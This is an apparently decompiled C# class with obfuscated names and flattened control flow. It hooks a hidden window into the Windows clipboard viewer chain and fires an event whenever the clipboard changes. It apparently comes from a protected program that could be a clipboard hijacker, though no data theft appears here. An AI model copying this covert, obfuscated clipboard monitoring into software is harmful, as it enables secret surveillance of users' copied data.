using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace X5CZaoh;

public class myVGu : NativeWindow
{
	public delegate void jKl(myVGu sender);

	private jKl m_Changed;

	private IntPtr ID;

	public event jKl Changed
	{
		add
		{
			int num = 0;
			jKl value2 = default;
			jKl jKl2 = default;
			jKl jKl3 = default;
			do
			{
				if (num == 3)
				{
					value2 = (jKl)Delegate.Combine(jKl2, value);
					num = 4;
				}
				if (num == 1)
				{
					jKl3 = this.m_Changed;
					num = 2;
				}
				if (num == 5)
				{
					if ((object)jKl3 != jKl2)
					{
						goto IL_009d;
					}
					num = 6;
				}
				if (num == 2)
				{
					goto IL_009d;
				}
				goto IL_00ae;
				IL_009d:
				jKl2 = jKl3;
				num = 3;
				goto IL_00ae;
				IL_00ae:
				if (num == 4)
				{
					jKl3 = Interlocked.CompareExchange(ref this.m_Changed, value2, jKl2);
					num = 5;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 6);
		}
		remove
		{
			int num = 0;
			jKl jKl2 = default;
			jKl value2 = default;
			jKl jKl3 = default;
			do
			{
				if (num == 4)
				{
					jKl2 = Interlocked.CompareExchange(ref this.m_Changed, value2, jKl3);
					num = 5;
				}
				if (num == 3)
				{
					value2 = (jKl)Delegate.Remove(jKl3, value);
					num = 4;
				}
				if (num == 2)
				{
					goto IL_0083;
				}
				goto IL_0094;
				IL_0094:
				if (num == 5)
				{
					if ((object)jKl2 != jKl3)
					{
						goto IL_0083;
					}
					num = 6;
				}
				if (num == 1)
				{
					jKl2 = this.m_Changed;
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				continue;
				IL_0083:
				jKl3 = jKl2;
				num = 3;
				goto IL_0094;
			}
			while (num != 6);
		}
	}

	[DllImport("user32")]
	private static extern IntPtr SetClipboardViewer(IntPtr handle);

	[DllImport("user32")]
	private static extern bool ChangeClipboardChain(IntPtr handle, IntPtr next);

	[DllImport("user32")]
	private static extern long SendMessage(IntPtr handle, int code, IntPtr flags, IntPtr data);

	public myVGu()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected Obj, but got Unknown
		((NativeWindow)this).CreateHandle(new CreateParams());
	}

	public void _9YK3v9e7pC()
	{
		int num = 0;
		do
		{
			if (num == 1)
			{
				ID = SetClipboardViewer(((NativeWindow)this).Handle);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
	}

	public void jNeOV1N7ulC()
	{
		int num = 0;
		do
		{
			if (num == 1)
			{
				ChangeClipboardChain(((NativeWindow)this).Handle, ID);
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 2);
	}

	protected override void WndProc(ref Message m)
	{
		int num = 0;
		int msg = default;
		do
		{
			if (num == 10 || num == 7)
			{
				goto IL_0209;
			}
			if (num == 1)
			{
				msg = m.Msg;
				num = 2;
			}
			if (num == 11)
			{
				goto IL_0084;
			}
			goto IL_00b7;
			IL_0209:
			((NativeWindow)this).WndProc(ref m);
			num = 13;
			goto IL_021f;
			IL_021f:
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_01d3:
			if (!(m.WParam == ID))
			{
				goto IL_0084;
			}
			num = 9;
			goto IL_01f8;
			IL_00c8:
			this.m_Changed(this);
			num = 6;
			goto IL_00e3;
			IL_00b7:
			if (num == 5)
			{
				goto IL_00c8;
			}
			goto IL_00e3;
			IL_00e3:
			if (num == 3)
			{
				if (msg == 781)
				{
					goto IL_01d3;
				}
				num = 4;
			}
			if (num == 6)
			{
				SendMessage(ID, m.Msg, m.WParam, m.LParam);
				num = 7;
			}
			if (num == 9)
			{
				ID = m.LParam;
				num = 10;
			}
			if (num == 2)
			{
				if (msg == 776)
				{
					goto IL_00c8;
				}
				num = 3;
			}
			if (num == 4)
			{
				goto IL_0209;
			}
			if (num == 8)
			{
				goto IL_01d3;
			}
			goto IL_01f8;
			IL_0084:
			SendMessage(ID, m.Msg, m.WParam, m.LParam);
			num = 12;
			goto IL_00b7;
			IL_01f8:
			if (num == 12)
			{
				goto IL_0209;
			}
			goto IL_021f;
		}
		while (num != 13);
	}

	~myVGu()
	{
		int num = 0;
		do
		{
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 1);
		try
		{
			jNeOV1N7ulC();
		}
		finally
		{
			((NativeWindow)this).Finalize();
		}
	}
}
